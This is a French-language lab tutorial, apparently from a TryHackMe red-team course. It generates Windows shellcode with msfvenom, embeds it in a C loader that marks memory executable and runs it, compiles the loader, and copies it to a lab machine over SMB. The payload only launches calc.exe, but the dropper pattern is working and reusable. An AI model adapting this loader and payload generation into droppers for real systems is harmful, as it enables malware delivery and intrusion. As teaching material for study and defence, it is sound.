Dans cette tâche, nous continuons à travailler avec le shellcode et montrons comment générer et exécuter du shellcode à l'aide d'outils publics tels que le framework Metasploit.

## Générer du shellcode à l'aide des outils publics

Le shellcode peut être généré pour un format spécifique avec un langage de programmation particulier. Cela dépend de vous. Par exemple, si votre dropper, qui est le fichier exe principal, contient le shellcode qui sera envoyé à une victime et est écrit en C, alors nous devons générer un format de shellcode qui fonctionne en C.

L'avantage de générer du shellcode via des outils publics est que nous n'avons pas besoin de créer un shellcode personnalisé à partir de zéro, et nous n'avons même pas besoin d'être un expert en langage assembleur. La plupart des frameworks C2 publics fournissent leur propre générateur de shellcode compatible avec la plateforme C2. Bien sûr, c'est très pratique pour nous, mais l'inconvénient est que la plupart, ou plutôt la totalité, des shellcodes générés sont bien connus des fournisseurs audiovisuels et peuvent être facilement détectés.

Nous utiliserons Msfvenom sur l'AttackBox pour générer un shellcode qui exécute les fichiers Windows. Nous allons créer un shellcode qui exécute l' `calc.exe` application.

Générer un shellcode pour exécuter calc.exe

```
user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
No encoder specified, outputting raw payload
Payload size: 193 bytes
Final size of c file: 835 bytes
unsigned char buf[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
```

En conséquence, le framework Metasploit génère un shellcode qui exécute la calculatrice Windows (calc.exe). La calculatrice Windows est largement utilisée comme exemple dans le processus de développement de logiciels malveillants pour montrer une preuve de concept. Si la technique fonctionne, une nouvelle instance de la calculatrice Windows apparaît. Cela confirme que tout shellcode exécutable fonctionne avec la méthode utilisée.  

## Injection de shellcode

Les pirates injectent du shellcode dans un thread en cours d'exécution ou nouveau et le traitent à l'aide de diverses techniques. Les techniques d'injection de shellcode modifient le flux d'exécution du programme pour mettre à jour les registres et les fonctions du programme afin d'exécuter le propre code de l'attaquant.

Continuons maintenant à utiliser le shellcode généré et exécutons-le sur le système d'exploitation. Ce qui suit est un code C contenant notre shellcode généré qui sera injecté en mémoire et exécutera "calc.exe".

Sur l'AttackBox, sauvegardons les éléments suivants dans un fichier nommé : `calc.c`

```
#include <windows.h>
char stager[] = {
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00" };
int main()
{
        DWORD oldProtect;
        VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);
        int (*shellcode)() = (int(*)())(void*)stager;
        shellcode();
}
```

Compilons-le maintenant sous forme de fichier exe :

Compilez notre programme C pour Windows

```
user@AttackBox$ i686-w64-mingw32-gcc calc.c -o calc-MSF.exe
```

Une fois que nous avons notre fichier exe, transférons-le sur la machine Windows et exécutons-le. Pour transférer le fichier, vous pouvez utiliser smbclient depuis votre AttackBox pour accéder au partage SMB sur \\MACHINE_IP\Tools avec les commandes suivantes (rappelez-vous que le mot de passe de l' `thm`utilisateur est `Password321`) :

Copiez calc-MSC.exe sur la machine Windows

```
user@AttackBox$ smbclient -U thm '//MACHINE_IP/Tools'
smb: \> put calc-MSF.exe
```

Cela devrait copier votre fichier sur `C:\Tools\`la machine Windows.

Bien que l'AV de votre machine doive être désactivé, n'hésitez pas à essayer de télécharger votre charge utile sur THM Antivirus Check à l'adresse `http://MACHINE_IP/`.

![e90959ae18f71d51d7b8681676029493](https://github.com/dsgsec/Red-Team/assets/82456829/0e3c42d6-fcb8-4b02-a1a6-4d1f82c7e7ea)

Le framework Metasploit propose de nombreux autres formats et types de shellcode pour tous vos besoins. Nous vous suggérons fortement de l'expérimenter davantage et d'élargir vos connaissances en générant différents shellcodes.

L'exemple précédent montre comment générer un shellcode et l'exécuter sur une machine cible. Bien entendu, vous pouvez reproduire les mêmes étapes pour créer différents types de shellcode, par exemple le shellcode Meterpreter.

## Générer du Shellcode à partir de fichiers EXE

Le shellcode peut également être stocké dans `.bin`des fichiers, qui sont un format de données brutes. Dans ce cas, nous pouvons en obtenir le shellcode en utilisant la  `xxd -i` commande.

Les frameworks C2 fournissent le shellcode sous forme de fichier binaire brut `.bin`. Si tel est le cas, nous pouvons utiliser la commande système Linux `xxd`pour obtenir la représentation hexadécimale du fichier binaire. Pour ce faire, nous exécutons la commande suivante : `xxd -i`.

Créons un fichier binaire brut en utilisant msfvenom pour obtenir le shellcode :

Générer un shellcode brut pour exécuter calc.exe

```
user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.bin
No encoder specified, outputting raw payload
Payload size: 193 bytes

user@AttackBox$ file /tmp/example.bin
/tmp/example.bin: data

```

Et exécutez la `xxd` commande sur le fichier créé :

Obtenez le shellcode à l'aide de la commande xxd

```
user@AttackBox$ xxd -i /tmp/example.bin
unsigned char _tmp_example_bin[] = {
  0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64,
  0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28,
  0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c,
  0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52,
  0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1,
  0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,
  0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01,
  0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75,
  0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b,
  0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,
  0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a,
  0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00,
  0x00, 0x50, 0x68, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5,
  0xa2, 0x56, 0x68, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x3c, 0x06, 0x7c,
  0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
  0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65,
  0x00
};
unsigned int _tmp_example_bin_len = 193;
```

Si nous comparons la sortie avec le shellcode précédent créé avec Metasploit, cela correspond.
